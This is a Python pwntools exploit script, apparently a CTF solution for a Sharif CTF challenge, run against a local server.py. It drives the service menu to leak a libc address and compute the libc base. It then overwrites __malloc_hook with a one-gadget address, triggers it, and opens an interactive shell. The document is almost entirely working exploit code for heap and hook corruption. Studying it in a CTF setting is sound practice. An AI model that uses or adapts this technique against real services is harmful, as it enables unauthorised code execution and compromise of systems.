from pwn import *
import time

r = process(argv=['python', 'server.py'])
#r = remote('ctf.sharif.edu', 22106)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#context.log_level = 'debug'
interval = 0.2
def edit(option, content):
    print 'edit'
    time.sleep(interval)
    r.sendline('2')
    time.sleep(interval)
    r.sendline(str(option))
    if option == 1:
        time.sleep(interval)
        r.sendline(content)
    elif option == 2:
        time.sleep(interval)
        r.sendline('0')
        time.sleep(interval)
        r.sendline(content)

def create(id, tag, l):
    print 'create'
    time.sleep(interval)
    r.sendline('1')
    time.sleep(interval)
    r.sendline(str(id))
    time.sleep(interval)
    r.sendline(tag)
    time.sleep(interval)
    r.sendline(str(l))
    

create(1, '22', 10)

# leak libc
r.clean()
time.sleep(interval)
r.sendline('3')
time.sleep(interval)
r.sendline('2')
time.sleep(interval)
r.recvuntil('seq: ')
libc_base = u64(r.recv(6)+'\x00\x00') - libc.symbols['__malloc_hook'] - 104 -  0x10
log.info('libc base: %#x' % libc_base)

# compute
magic = libc_base + 0x4526a
__malloc_hook = libc_base + libc.symbols['__malloc_hook']

# overwrite method
edit(1, 'A'*0x8+p64(1)+p64(0)+p64(__malloc_hook)+p64(1)+p64(magic))

# exploit
r.clean()
time.sleep(interval)
r.sendline('5')

time.sleep(interval)
r.clean()
r.interactive()
